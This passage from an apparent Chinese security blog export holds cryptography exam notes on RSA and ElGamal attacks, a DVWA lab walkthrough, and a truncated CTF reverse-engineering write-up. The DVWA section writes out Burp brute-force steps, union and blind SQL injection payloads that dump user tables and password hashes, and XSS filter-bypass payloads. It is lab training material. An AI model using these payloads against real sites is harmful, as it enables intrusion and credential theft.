n\n$$\n\n### **🌟RSA的攻击**\n\n#### 同模攻击：\n\n假设 m 是明文，两用户的公钥分别是 e<sub>1</sub> 和 e<sub>2</sub> ，且 ( e<sub>1</sub> ,e<sub>2</sub> ) = 1，共同模数 N ，两密文为\n$$\nc_1 \\equiv m^{e_1}\\mod N\\\\\nc_2 \\equiv m^{e_2}\\mod N\n$$\n攻击者知道 N, e<sub>1</sub> , e<sub>2</sub>, c<sub>1</sub> 和 c<sub>2</sub>，可如下恢复明文 m\n\n ( e<sub>1</sub> ,e<sub>2</sub> ) = 1，由欧几里得算法可找出 r, s 满足 re<sub>1</sub> + se<sub>2</sub> = 1。假定 r 是负数，那么\n$$\n(c_1^{-1})^{-r}c_2^s=m^{re_1+se_2}\\equiv m\\mod N\n$$\n无需密钥 d，就可得到明文 m\n\n**防御：**使用 RSA 公钥密码的通信中，不同用户的密钥不能有相同的模值\n\n#### 低加密指数攻击：\n\n小的公钥可加快加密速度，但过小公钥易受攻击\n\n三个用户都使用 3 作为公钥，对同一明文 m 加密\n$$\nc_1\\equiv m^e \\mod n_1\\\\\nc_2\\equiv m^e \\mod n_2\\\\\nc_3\\equiv m^e \\mod n_3\n$$\n运用中国剩余定理，在 e = 3 时，可以得到\n$$\nc_x\\equiv m^3\\mod n_1n_2n_3\n$$\n所以\n$$\nm=\\sqrt[3]{c_x}\n$$\n**防御：**对短消息，用随机数填充以保证 \n$$\nm^e\\mod n\\neq m^e\n$$\n从而杜绝低加密指数攻击\n\n \n\n## 🌟ElGamal\n\n### **🌟ElGamal算法描述：**\n\n- 密钥的生成\n\n  - 选取大素数 p、g ∈ Z<sub>p</sub><sup>*</sup> 是一个生成元，p、g 作为系统参数所有用户共享\n  - 每个用户 U 都随机挑选整数 x，2 ≤ x ≤ p-2，计算\n\n  $$\n  y=g^x\\mod p\n  $$\n\n  - **y 作为用户 U 的公钥，x 作为用户 U 的私钥**\n\n- 加密\n\n  - 用户 A 把明文编码为一个 0 ~ p-1 之间的整数 m\n\n  - A 挑选一个秘密随机数 r （2 ≤ r ≤ p-2）\n    $$\n    c_1=g^r\\mod p \\\\\n    c_2 = m*y^r\\mod p\n    $$\n\n  - A 把二元组（c1, c2）作为密文传送给用户 B。\n\n- 解密\n\n  - B 收到密文二元组后，做解密计算\n    $$\n    m=c_2*(c_1^x)^{-1}\\mod p\n    $$\n\n**算法正确性验证：**\n$$\nc_2(c_1^x)^{-1}\\mod p=(y^rm)(g^{rx})^{-1} \\mod p \\\\\n=(g^{xr}m)g^{-rx}\\mod p \\\\\n=m\\mod p\n$$\n\n> ps: 安全性分析 8 考\n\n## 第七章：数字签名\n\n数字签名的目的：保证信息的完整性和真实性\n\n完善的签名方案应满足的条件：\n\n- 不可否认性\n- 不可伪造性\n- 公正的仲裁\n\n## 🌟RSA数字签名方案\n\n### 签名算法如下：\n\n- 生成密钥（与加密系统一样）\n\n- 签名过程 (d, n)：\n\n  用户 A 对消息 M ∈ Z<sub>n</sub> 进行签名，计算\n  $$\n  S = Sig(H(M)) = H(M)^d \\mod n\n  $$\n  并将 S 附在消息 M 后，发送\n\n- 验证过程 (e, n)：\n\n  给定 (M, S) ，Ver(M, S)为真，则下式成立\n  $$\n  H(M) = S^e \\mod n\n  $$\n\n- 正确性\n\n  因为\n  $$\n  s\\equiv h(m)^d\\mod n\\\\\n  de \\equiv 1\\mod \\varphi(n)\\\\\n  \\varphi(n)=(p-1)(q-1)\n  $$\n  所以\n  $$\n  s^e\\equiv h(m)^{ed}\\equiv h(m)^{k\\varphi(n)+1}\\equiv h(m)h(m)^{k\\varphi(n)}\\\\\n  \\equiv h(m)[h(m)^{\\varphi(n)}]^k\\equiv h(m)\\mod n\n  $$\n\n### 安全性\n\n**如果不加 Hash 函数，直接对消息进行签名**\n\n**一般攻击：**\n\n攻击者任选一个数据 Y，用 A 的公钥计算 X = Y<sup>e</sup> mod n，便可以用 Y 伪造 A 对消息 X 的签名\n$$\nY = X^d \\mod n\n$$\n**利用已有签名进行攻击:**\n\n如果消息 M<sub>1</sub>、M<sub>2</sub> 的签名分别是  S<sub>1</sub>、S<sub>2</sub>，则任何指导 M<sub>1</sub>、M<sub>2</sub>  ，S<sub>1</sub>、S<sub>2</sub> 的人可以伪造对消息 M<sub>1</sub>、M<sub>2</sub> 的签名  S<sub>1</sub>、S<sub>2</sub>，因为\n$$\nSig(M_1,M_2) = Sig(M_1)Sig(M_2)\n$$\n**利用签名获得明文:**\n\n截获 C＝M<sup>e</sup> mod n，选择随机数 r，计算\n$$\nx = r^e \\mod n\\\\\ny = xC\\mod n\n$$\n设法让发送者对 y 签名，获得\n$$\nS = y^d\\mod n\n$$\n攻击者计算\n$$\nr^{-1}S\\mod n=r^{-1}y^d\\mod n\\\\\n=r^{-1}x^dC^d\\mod n=C^d\\mod n=M\n$$\n\n\n其中 H(M) 的另外一个作用就是可以**加快签名速度**。\n\n\n\n## 🌟ElGamal数字签名方案\n\n### 签名算法如下：\n\n- 系统初始化：选择大素数 p，选择生成元  g ∈ Z<sub>p</sub><sup>*</sup> 和随机数 x ∈ <sub>R</sub>Z<sub>p</sub>。\n\n  公钥 (p, g, y)，私钥为 x (1 ≤ x ≤ p-1)，其中 \n  $$\n  y=g^x\\mod p\n  $$\n\n- 签名过程：给定消息 M，签名者如下计算\n\n  - 选择随机数 k ∈ Z<sub>p</sub><sup>*</sup>，且 k 与 (p-1) 互素\n\n  - 计算 M 的哈希值 H(M) ，计算\n    $$\n    r = g^k\\mod p\\\\\n    s=(H(M)-xr)k^{-1}(\\mod p-1)\n    $$\n\n  - 将 (r, s) 作为签名，与 M 一起发送给接收方\n\n- 签名验证\n\n  - 计算消息 M 哈希值 H(M)\n\n  - 验证公式\n    $$\n    y^rr^s=g^{H(M)}\\mod p\n    $$\n    成立则认为 (r, s)为有效签名，否则认为签名是伪造的\n\n- 正确性\n  $$\n  ks\\equiv h(m)-xr\\mod (p-1)\\\\\n  g^{ks}\\equiv g^{h(m)-xr}\\mod p\\\\\n  g^{ks}g^{xr}\\equiv g^{h(m)}\\mod p\\\\\n  y^rr^s=g^{H(m)}\\mod p\n  $$\n\n安全性：\n\n- 非确定性数字签名算法，同一消息 M 的签名依赖于随机数 k\n\n- 安全性基于有限域上计算离散对数的困难性（DLP）\n\n  实际中常用本原元 α 生成一个阶为素数的子群，所有元素都是本原元，不存在子群，从而抵抗这种攻击。\n\n- 随机数 k 不能泄露（已知 k 可以计算 x ）\n\n- 随机数 k 不能被重复使用（泄露 x ）\n\n  设 k 用来对两个不同消息签名，则 r 相同。签名分别为 (r, s<sub>1</sub>), (r, s<sub>2</sub>)。因为\n  $$\n  s_1\\equiv [h(m_1)-xr]k^{-1}\\mod (p-1)\\\\\n  s_2\\equiv [h(m_2)-xr]k^{-1}\\mod (p-1)\\\\\n  (s_1-s_2)k\\equiv [h(m_1)-h(m_2)]\\mod (p-1)\n  $$\n  因为消息 m<sub>1</sub>，m<sub>2</sub> 不同，他们所以签名不同的概率很大，则\n  $$\n  k\\equiv [h(m_1)-h(m_2)](s_1-s_2)^{-1}\\mod (p-1)\n  $$\n  之后可以将 k 代入上面两式来计算私钥\n  $$\n  x\\equiv \\frac{h(m_1)-s_1k}{r}\\mod p-1\n  $$\n\n- 哈希函数的应用\n\n  如果未使用 Hash 函数则易受到攻击。攻击者选取任一整数对 (u, v)，满足\n  $$\n   gcd(v, p-1)=1\n  $$\n  计算\n  $$\n  r\\equiv g^uy^v\\mod p\\\\\n  s\\equiv -rv^{-1}\\mod (p-1)\\\\\n  m\\equiv su\\mod p\n  $$\n  则消息 m 及其签名 (r, s) 可以被验证者接受，即攻击者成功进行存在性伪造。因为\n  $$\n  y^rr^s\\equiv y^r(g^ug^v)^s\\equiv y^{r+w}g^{us}\\equiv g^m\\mod p\n  $$\n  又因为\n  $$\n  g^m\\equiv g^{su}\\mod p\n  $$\n  也就是说，签名 (r, s) 使等式\n  $$\n  y^rr^s=g^{m}\\mod p\n  $$\n  成立\n\n  所以使用 Hash 函数能够有效提高 ElGamal 数字签名方案安全性。\n\n## Schnorr签名体制\n\n### 签名算法如下：\n\n- 系统初始化：p、q 大素数，选择生成元 g ∈ Z<sub>p</sub><sup>*</sup> ，且 \n  $$\n  g^q\\equiv 1\\mod q\\ne 1\n  $$\n  选择随机数 1 < x < q，计算\n  $$\n  y\\equiv g^x\\mod p\n  $$\n  公钥为（p, q, g, y），私钥为（ x ）\n\n- 签名算法\n\n  签名者选取随机数 k，1 ≤ k ≤ q-1，计算\n  $$\n  r\\equiv g^k\\mod p\\\\\n  e= h(m,r)\\\\\n  s\\equiv (xe+k)\\mod q\n  $$\n  计算得签名 (e, s)，其中 h 为安全的 Hash 函数\n\n- 验证算法\n\n  收到消息 m 和签名 (e, s)，计算\n  $$\n  r_1\\equiv g^sy^{-e}\\mod p\n  $$\n  验证\n  $$\n  e=h(m,r_1)\n  $$\n  等式成立则签名有效；否则无效\n\n- 正确性\n\n  因为\n  $$\n  r\\equiv g^k\\mod p\\\\\n  e= h(m,r)\\\\\n  s\\equiv (xe+k)\\mod q\n  $$\n  所以\n  $$\n  r_1\\equiv g^sy^{-e}\\equiv g^sg^{-xe}\\equiv g^{s-xe}\\\\\n  \\equiv g^{xe+k-xe}\\equiv g^k\\equiv r\\mod p\n  $$\n  因此\n  $$\n  h(m, r_1)=h(m,r)=e\n  $$\n\n安全性：\n\nSchnorr数字签名方案中 g 为 Z<sub>p</sub><sup>*</sup> 的 q 阶子群的生成元，较 Elgamal 签名方案的生成元阶为 p-1。所以从穷尽搜索签名者密钥的角度，Elgamal 签名安全性更高。除此之外，安全性与 Elgamal 签名方案相同。\n\n\n\n\n\n> 试卷题型\n>\n> > 计算题（60分） \n> >\n> > 6道或8道\n>\n> > 分析题（20分）\n> >\n> > 4个小题\n>\n> > 综合题（20分）\n> >\n> > 3个小题或2个小题\n\n","tags":["密码学"]},{"title":"DVWA部分复现（Brute Force、SQL Injection、SQL Injection (Blind)、XSS（Reflected）、XSS（Stored））","url":"/2019/12/09/dwva-bruteforce/","content":"\n### Brute Force\n\n#### low级别\n\n![QMFPu6.png](https://s2.ax1x.com/2019/12/03/QMFPu6.png)\n\n**爆破利用burpsuite即可完成**\n\n抓包，并送至intruder\n\n![QMFUvq.png](https://s2.ax1x.com/2019/12/03/QMFUvq.png)\n\n选择爆破点password和字典开始爆破\n\n![QMFs54.png](https://s2.ax1x.com/2019/12/03/QMFs54.png)\n\n点击页面长度进行排序，可看到密码为`password`返回的页面长度与别的明显不同\n\n![QMFoIe.png](https://s2.ax1x.com/2019/12/03/QMFoIe.png)\n\n载入详情，查看渲染，回显登录成功，由此爆破出密码为`password`。\n\n![QMkPRs.png](https://s2.ax1x.com/2019/12/03/QMkPRs.png)\n\n#### medium级别\n\n查看源代码如下\n\n```php\n<?php\nif( isset( $_GET[ 'Login' ] ) ) {\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    $pass = md5( $pass );\n\n    // Check the database\n    $query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n    if( $result && mysqli_num_rows( $result ) == 1 ) {\n        // Get users details\n        $row    = mysqli_fetch_assoc( $result );\n        $avatar = $row[\"avatar\"];\n\n        // Login successful\n        echo \"<p>Welcome to the password protected area {$user}</p>\";\n        echo \"<img src=\\\"{$avatar}\\\" />\";\n    }\n    else {\n        // Login failed\n        sleep( 2 );\n        echo \"<pre><br />Username and/or password incorrect.</pre>\";\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n?> \n```\n\n比low级别增加了`mysqli_real_escape_string() `函数，此函数会转义在 SQL 语句中使用的字符串中的特殊字符。可以抵御sql注入。登录失败会做`sleep(2)`但仍可以进行爆破，可用同low方法进行爆破，只是速度会变慢。\n\n#### high级别\n\n查看源代码如下\n\n```php\n<?php\nif( isset( $_GET[ 'Login' ] ) ) {\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = stripslashes( $user );\n    $user = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = stripslashes( $pass );\n    $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    $pass = md5( $pass );\n\n    // Check database\n    $query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    if( $result && mysqli_num_rows( $result ) == 1 ) {\n        // Get users details\n        $row    = mysqli_fetch_assoc( $result );\n        $avatar = $row[\"avatar\"];\n\n        // Login successful\n        echo \"<p>Welcome to the password protected area {$user}</p>\";\n        echo \"<img src=\\\"{$avatar}\\\" />\";\n    }\n    else {\n        // Login failed\n        sleep( rand( 0, 3 ) );\n        echo \"<pre><br />Username and/or password incorrect.</pre>\";\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n// Generate Anti-CSRF token\ngenerateSessionToken();\n?>\n```\n\n对比medium级别，username和password的过滤机制增加了`stripslashes() `函数，可以进一步的抵御sql注入，代码加入了user_token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。并在结尾处增加了`sleep( rand( 0, 3 ) )`登录失败的延时机制。low方式无法再次使用。每次登录都要提交Login、user_token、username和password。\n\n代理抓包，发送至intruder，选择Pitchfork攻击方式，并确认爆破点password和user_token\n\n![QMlEOe.png](https://s2.ax1x.com/2019/12/03/QMlEOe.png)\n\n在options栏找到Grep - Extract，点击Add。\n\n![QMltTs.png](https://s2.ax1x.com/2019/12/03/QMltTs.png)\n\n点击Refetch response，进行一个请求，即可看到响应报文，直接选取需要提取的token\n\n![QMtlUe.png](https://s2.ax1x.com/2019/12/03/QMtlUe.png)\n\n设置payload1为常用密码\n\n![QMtB5Q.png](https://s2.ax1x.com/2019/12/03/QMtB5Q.png)\n\n设置payload2，选择payload type为“Recursive grep”\n\n![QMtoG9.png](https://s2.ax1x.com/2019/12/03/QMtoG9.png)\n\n开始爆破，查看爆破结果，爆破成功，密码password\n\n![QMN9xI.png](https://s2.ax1x.com/2019/12/03/QMN9xI.png)\n\n\n\n### SQL Injection\n\n#### low级别\n\n![image.png](https://i.loli.net/2019/12/03/63LydJsGWtjeQIO.png)\n\n输入`1' and '1'='1`，回显正常id=1的情况，存在SQL注入\n\n![image.png](<https://i.loli.net/2019/12/03/buUpDNHmhsBtTkg.png>)\n\n之后猜测SQL语句字段数，输入`1' order by 3 #` ，提示不存在，由此判断查询语句存在2字段。\n\n![image.png](https://i.loli.net/2019/12/03/d5Oos6fS2rKTQa8.png)\n\n之后可用`1′ union select 1,database() #`查询数据库\n\n![image.png](https://i.loli.net/2019/12/03/TjgIWwQpKOdmVFH.png)\n\n查表`1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`\n\n![image.png](https://i.loli.net/2019/12/03/tWDmjkMqE4QoHiI.png)\n\n查字段名`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`\n\n![image.png](https://i.loli.net/2019/12/03/QCw1hrlXDN4FPyo.png)\n\n查字段值`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`\n\n![image.png](https://i.loli.net/2019/12/03/uvRCBSrXeDNw9HU.png)\n\n#### medium级别\n\n本题只能选择再提交，所以选择抓包的方式进行数据包修改参数id\n\n![QMzIzV.png](https://s2.ax1x.com/2019/12/03/QMzIzV.png)\n\n更改成1‘ and 1=2 #，出现报错，说明不是字符型注入\n\n![QQpM1x.png](https://s2.ax1x.com/2019/12/03/QQpM1x.png)\n\n尝试数字型注入，1 and 1=1#，回显正常，找到注入点\n\n![QQpN4A.png](https://s2.ax1x.com/2019/12/03/QQpN4A.png)\n\n剩下爆数据库，表名可参考low级别payload\n\n\n\n#### high级别\n\n与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，控制只输出一个结果。\n\n`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`\n\n![QQ90i9.png](https://s2.ax1x.com/2019/12/03/QQ90i9.png)\n\nHigh级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。\n\n\n\n### SQL Injection (Blind)\n\n#### low级别\n\n只会显示exists和MISSING，其中exists代表查询正确，MISSING代表查询错误\n\n![QQCEFJ.png](https://s2.ax1x.com/2019/12/03/QQCEFJ.png)\n\n开始尝试数据库名长度，使用语句` 1' and length(database())=1#`，发现不成功一直到4回显exists，表明数据库名长度为4\n\n![QQPg4H.png](https://s2.ax1x.com/2019/12/03/QQPg4H.png)\n\n开始猜测数据库名，`1' and ascii(substr(database(),1,1))>97#`和`1' and ascii(substr(database(),1,1))<123#`判断第一个字母是否在a-z中间，返回都是exists\n\n![QQPjvq.png](https://s2.ax1x.com/2019/12/03/QQPjvq.png)\n\n接着用二分法证实得第一个字母为d。同理求出完整数据库名为 dvwa\n\n之后开始猜有几个表，猜解表的长度，猜解表的名称\n\n猜测表个数`1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2#`，为2。\n\n![QQiJMt.png](https://s2.ax1x.com/2019/12/03/QQiJMt.png)\n\n猜第一个表名，从第一位开始猜，二分法，可用以下语句尝试，最后得到表1完整名称是guestbook\n\n`1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=103#`\n\n猜第二个表名，用以下语句尝试，得到表2的名称是users\n\n`1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1))=117#`\n\n以后按照以上类似方法就可得到字段值，不再累述\n\n### medium级别\n\n![QQE1Tf.png](https://s2.ax1x.com/2019/12/03/QQE1Tf.png)\n\n查看源码\n\n```php\n<?php\nif( isset( $_POST[ 'Submit' ]  ) ) {\n    // Get input\n    $id = $_POST[ 'id' ];\n    $id = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $id ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Check database\n    $getid  = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $getid ); // Removed 'or die' to suppress mysql errors\n    // Get results\n    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors\n    if( $num > 0 ) {\n        // Feedback for end user\n        echo '<pre>User ID exists in the database.</pre>';\n    }\n    else {\n        // Feedback for end user\n        echo '<pre>User ID is MISSING from the database.</pre>';\n    }\n    //mysql_close();\n}\n?>\n```\n\n相比low级别添加了`mysqli_real_escape_string()`，过滤了一些单引号等字符，并使用post方法发送数据。但此题没有涉及字符型注入，所以直接构造语句\n\n`1 and length(database())=4#`\n\n盲注方法参照low级别，不再累述\n\n#### high级别\n\n![QQVX24.png](https://s2.ax1x.com/2019/12/03/QQVX24.png)\n\n查看源代码\n\n```php\n<?php\nif( isset( $_COOKIE[ 'id' ] ) ) {\n    // Get input\n    $id = $_COOKIE[ 'id' ];\n\n    // Check database\n    $getid  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $getid ); // Removed 'or die' to suppress mysql errors\n\n    // Get results\n    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors\n    if( $num > 0 ) {\n        // Feedback for end user\n        echo '<pre>User ID exists in the database.</pre>';\n    }\n    else {\n        // Might sleep a random amount\n        if( rand( 0, 5 ) == 3 ) {\n            sleep( rand( 2, 4 ) );\n        }\n        // User wasn't found, so the page wasn't!\n        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );\n        // Feedback for end user\n        echo '<pre>User ID is MISSING from the database.</pre>';\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n?>\n```\n\nHigh级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。由于时间盲注的准确性受到影响，所以只利用基于布尔的盲注\n\n`抓包将cookie中参数id改为1' and length(database())=4 #，显示存在`\n\n\n\n### XSS（Reflected）\n\n#### Low级别\n\n![QdOxwn.png](https://s2.ax1x.com/2019/12/09/QdOxwn.png)\n\n直接引用了name参数，并没有任何的过滤和检查，存在明显的XSS漏洞，输入`<script>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### Medium级别\n\n![image.png](https://i.loli.net/2019/12/09/iSgKGcIHMwzAYeu.png)\n\n对输入进行了过滤，使用str_replace函数将输入中的`<script>`删除输入`<sc<script>ript>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### High级别\n\n![image.png](https://i.loli.net/2019/12/09/U6SQV1OoLYbFuGx.png)\n\npreg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效，可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。\n\n输入`<img src=1 onerror=alert(/xss/)>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n\n\n### XSS（Stored）\n\n#### Low级别\n\n![image.png](https://i.loli.net/2019/12/09/fBI6OXJDlbukiFA.png)\n\n对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。message一栏输入`<script>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### Medium级别\n\n![image.png](https://i.loli.net/2019/12/09/MgtfzTHRmNqjuGy.png)\n\n由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。\n\n抓包改name参数为`<sc<script>ript>alert(/xss/)</script>`，成功弹窗\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### High级别\n\n![image.png](https://i.loli.net/2019/12/09/EfIJ4uLP1rKwhkM.png)\n\n使用正则表达式过滤了`<script>`标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS\n\n抓包改name参数为`<img src=1 onerror=alert(/xss/)>`，成功\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n","tags":["漏洞复现"]},{"title":"buuctf Youngter-drive","url":"/2019/11/08/drive/","content":"\n查壳upx壳，直接拖入kali `upx -d`脱壳，尝试运行无果，拖入ida F5\n\n[![MZbZO1.png](https://s2.ax1x.com/2019/11/08/MZbZO1.png)](https://imgchr.com/i/MZbZO1)\n\n```c\nint sub_411BD0()\n{\n  printf(\n    \"1111111111111111111111111111111111111111111111111111111111111111111111111111111\\n\"\n    \"*******************************************************************************\\n\"\n    \"**************             ****************************************************\\n\"\n    \"**************   ********   *********************                 *************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *******   **********************   ***************************\\n\"\n    \"**************   ****   *************************   ***************************\\n\"\n    \"**************   *    ***************************                **************\\n\"\n    \"**************   ***    *************************   ***************************\\n\"\n    \"**************   ******   ***********************   ***************************\\n\"\n    \"**************   ********   *********************   ***************************\\n\"\n    \"**************   **********   *******************   ***************************\\n\"\n    \"**************   ***********    *****************                 *************\\n\"\n    \"*******************************************************************************\\n\"\n    \"1111111111111111111111111111111111111111111111111111111111111111111111111111111\\n\");\n  printf(\"input flag:\\n\");\n  return scanf(\"%36s\", &Source);\n}\n```\n\n`sub_411BD0`函数是把输入的 flag 存到全局缓冲区 `Source` 里面，而且最多只存 36 个字符\n\n由API可知这道题涉及到多线程，`CreateThread` API 会创建新线程，`CreateMutex` 创建一个互斥变量，用于防止多线程中出现资源争用，此变量存于全局句柄`::hObject`中。创建了两线程`StartAddress`、`sub_41119F`，跟进查看，两者代码相似，区别在与`StartAddress`中的一句`sub_41112C(&Source, dword_418008);`。两者交替执行，直至`dword_418008 > -1`。\n\n```c\nvoid __stdcall StartAddress_0(int a1)\n{\n  while ( 1 )\n  {\n    WaitForSingleObject(hObject, 0xFFFFFFFF);\n    if ( dword_418008 > -1 )\n    {\n      sub_41112C(&Source, dword_418008);\n      --dword_418008;\n      Sleep(0x64u);\n    }\n    ReleaseMutex(hObject);\n  }\n}\n\n\nvoid __stdcall sub_411B10(int a1)\n{\n  while ( 1 )\n  {\n    WaitForSingleObject(hObject, 0xFFFFFFFF);\n    if ( dword_418008 > -1 )\n    {\n      Sleep(0x64u);\n      --dword_418008;\n    }\n    ReleaseMutex(hObject);\n  }\n}\n```\n\n跟入`sub_41112C`却警告`positive sp value has been found`，百度得知是栈平衡缺失所导致的问题（函数调用前的sp值与调用结束的sp值不相同），可手动调整sp值解决。\n\n\n\n[![MZLlMd.png](https://s2.ax1x.com/2019/11/08/MZLlMd.png)](https://imgchr.com/i/MZLlMd)\n\n在 选项 -> 常规中勾选堆栈指针，即可在地址旁显示sp的值\n\n[![MZLoe1.png](https://s2.ax1x.com/2019/11/08/MZLoe1.png)](https://imgchr.com/i/MZLoe1)\n\n调到警告处，可发现sp值确实发生了偏差，在sp值为0时，又运行了`pop edp`这条语句导致栈不平衡\n\n[![MZOFfS.png](https://s2.ax1x.com/2019/11/08/MZOFfS.png)](https://imgchr.com/i/MZOFfS)\n\n在`00411A03`使用快捷键`Alt+k`，将新旧sp差值改为0x0，修改完成后即可F5得到伪代码\n\n![1573222975119](C:\\Users\\12424\\AppData\\Roaming\\Typora\\typora-user-images\\1573222975119.png)\n\n此函数就是加密函数，参数`a1`为缓冲区Source地址，`a2`为常量`dword_418008`，值为29，线程每执行一次减一，两线程公用。`sub_411940`判断了字符是不是字母再变换，大写字母变换成 `off_418000[0][*(_BYTE *)(a2 + a1) - 38]`，小写字母变换成 `off_418000[0][*(_BYTE *)(a2 + a1) - 96]`， `off_418000[0]` 是一个字符串，内容是 `QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm`。注意是两线程交替执行，所以**只会有一半的字符改变**。\n\n```c\nchar *__cdecl sub_411940(int a1, int a2)\n{\n  char *result; // eax\n  char v3; // [esp+D3h] [ebp-5h]\n\n  v3 = *(_BYTE *)(a2 + a1);\n  if ( (v3 < 97 || v3 > 122) && (v3 < 65 || v3 > 90) )\n    exit(0);\n  if ( v3 < 97 || v3 > 122 )\n  {\n    result = off_418000[0];\n    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38];\n  }\n  else\n  {\n    result = off_418000[0];\n    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96];\n  }\n  return result;\n}\n```\n\n看到`sub_411190()`,此函数用经变换过后的`Source`与`off_418004[]`逐位对比，`off_418004[]`内容为`TOiZiZtOrYaToUwPnToBsOaOapsyS`\n\n```c\nint sub_411880()\n{\n  int i; // [esp+D0h] [ebp-8h]\n\n  for ( i = 0; i < 29; ++i )\n  {\n    if ( Source[i] != off_418004[i] )\n      exit(0);\n  }\n  return printf(\"\\nflag{%s}\\n\\n\", 